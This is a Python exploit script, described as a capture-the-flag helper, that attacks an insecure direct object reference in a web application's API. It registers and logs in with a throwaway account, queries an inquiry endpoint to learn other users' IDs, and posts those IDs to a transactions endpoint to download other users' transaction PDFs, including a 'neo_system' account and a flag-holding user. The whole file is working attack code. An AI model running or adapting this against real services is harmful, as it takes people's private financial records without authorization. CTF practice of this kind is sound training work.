#!/usr/bin/env python3
"""
CTF helper: register → login → look up user IDs → download PDFs.

Usage:
    python script.py https://target.tld
"""

import sys
import requests
from pathlib import Path
from typing import Optional


def die(msg: str, code: int = 1) -> None:
    print(f"[!] {msg}")
    sys.exit(code)


def ensure_ok(resp: requests.Response, what: str) -> None:
    """Raise helpful errors for non-2xx responses."""
    if not resp.ok:
        body_preview = (resp.text or "")[:300].replace("\n", " ")
        die(f"{what} failed (HTTP {resp.status_code}). Response: {body_preview}")


def get_json(resp: requests.Response, what: str) -> dict:
    """Parse JSON body safely with a clear error if it’s not JSON."""
    try:
        return resp.json()
    except ValueError:
        die(f"{what} did not return JSON. Content-Type: {resp.headers.get('Content-Type')}")


def save_pdf(content: bytes, path: Path) -> None:
    """Save bytes as a PDF file and confirm."""
    if not content.startswith(b"%PDF"):
        # Some APIs still return PDFs without %PDF at byte 0 (e.g., BOM or wrapper).
        # We’ll save anyway but warn the user.
        print("[!] Warning: response does not start with %PDF. Saving bytes as-is.")
    path.write_bytes(content)
    print(f"[+] Saved PDF → {path.resolve()}")


def inquire_user_id(session: requests.Session, base_url: str, username: str) -> Optional[str]:
    """Fetch a user’s ID by username."""
    url = f"{base_url}/api/v2/auth/inquire"
    resp = session.get(url, params={"username": username})
    ensure_ok(resp, f"Inquiry for username '{username}'")
    data = get_json(resp, "Inquiry")
    user_id = data.get("_id")
    if not user_id:
        die(f"Could not find _id for username '{username}'. Response keys: {list(data.keys())}")
    print(f"[+] Found user '{username}' with _id: {user_id}")
    return user_id


def download_transactions(session: requests.Session, base_url: str, user_id: str, outfile: str) -> None:
    """POST to the transactions endpoint with a user _id and save the returned PDF."""
    url = f"{base_url}/api/v1/transactions/download-transactions"
    resp = session.post(url, json={"_id": user_id})
    ensure_ok(resp, "Downloading transactions")
    ct = resp.headers.get("Content-Type", "")
    if "pdf" not in ct.lower():
        print(f"[!] Unexpected Content-Type: {ct}. Attempting to save anyway.")
    save_pdf(resp.content, Path(outfile))


def main() -> None:
    # ----- Arguments & base URL -----
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")
    print(f"[*] Target base URL: {base_url}")

    # ----- Session bootstrap -----
    session = requests.Session()

    # If the app sets cookies on the landing page, hit base first
    session.get(base_url)

    # ----- Registration -----
    register_url = f"{base_url}/api/v2/auth/register"
    register_payload = {
        "username": "newuser",
        "email": "newemail@test.com",
        "password": "newnewnew",
    }
    print("[*] Registering a new user...")
    r = session.post(register_url, json=register_payload)
    if r.status_code == 400:
        print("[i] User already exists. Continuing to login.")
    else:
        ensure_ok(r, "Registration")
        print("[+] Registration completed.")

    # ----- Login (reuse same payload for convenience) -----
    login_url = f"{base_url}/api/v2/auth/login"
    print("[*] Logging in...")
    r = session.post(login_url, json=register_payload)
    ensure_ok(r, "Login")
    print("[+] Login successful.")

    # ----- Recon: find IDs we saw exposed on the dashboard -----
    print("[*] Looking up user IDs...")

    # Example 1: neo_system (visible on dashboard)
    neo_id = inquire_user_id(session, base_url, "neo_system")

    # Try downloading their transactions
    print("[*] Downloading transactions for 'neo_system'...")
    download_transactions(session, base_url, neo_id, outfile="neo_system.pdf")

    # Example 2: user_with_flag (CTF target)
    print("[*] Targeting 'user_with_flag' next...")
    flag_user_id = inquire_user_id(session, base_url, "user_with_flag")

    print("[*] Downloading transactions for 'user_with_flag' (expect the flag inside)...")
    download_transactions(session, base_url, flag_user_id, outfile="flag.pdf")

    print("[✓] Done. Check 'neo_system.pdf' and 'flag.pdf' in the current folder.")


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as e:
        die(f"Network error: {e}")
